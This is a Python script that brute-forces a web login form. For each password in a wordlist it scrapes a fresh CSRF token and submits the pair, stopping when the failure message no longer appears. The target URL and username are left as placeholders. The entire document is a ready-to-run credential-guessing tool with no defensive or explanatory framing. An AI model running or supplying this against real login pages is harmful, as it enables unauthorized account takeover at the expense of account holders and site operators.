import requests
from bs4 import BeautifulSoup

# URL of the login page and login submission URL
LOGIN_PAGE_URL = "x"

# Username to brute force
username = "x"

# Path to the password list
password_list = "wordlist.txt"

def get_csrf_token(session, login_page_url):
    # Fetch the login page
    response = session.get(login_page_url)

    # Print the current URL
    print(f"Current URL: {response.url}")
    
    # Parse the page content with BeautifulSoup to extract the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find the CSRF token in the hidden input field
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    
    return csrf_token

def attempt_login(session, login_page_url, username, password, csrf_token=None):
    # Prepare the login data with username, password, and the extracted CSRF token
    login_data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }
    
    # Send the POST request to attempt login
    response = session.post(login_page_url, data=login_data)
    
    # Check if the login was successful (based on response content)
    if "Invalid username or password" not in response.text:
        return True  # Login successful
    return False  # Login failed

def main():
    # Open the password file and read each password
    with open(password_list, 'r') as file:
        passwords = file.read().splitlines()

    # Start a session to persist cookies and headers
    session = requests.Session()

    # Loop through each password and attempt login
    for password in passwords:
        # Fetch a fresh CSRF token for each login attempt
        try:
            csrf_token = get_csrf_token(session, LOGIN_PAGE_URL)
        except:
            print("Failed to fetch CSRF token.")
        
        # Debugging output: Print the token and password being tried
        print(f"Trying password: {password} with CSRF token: {csrf_token}")

        # Attempt login
        if attempt_login(session, LOGIN_PAGE_URL, username, password, csrf_token):
            print(f"Success! The password is: {password}")
            break
        else:
            print("Login failed.")

if __name__ == "__main__":
    main()
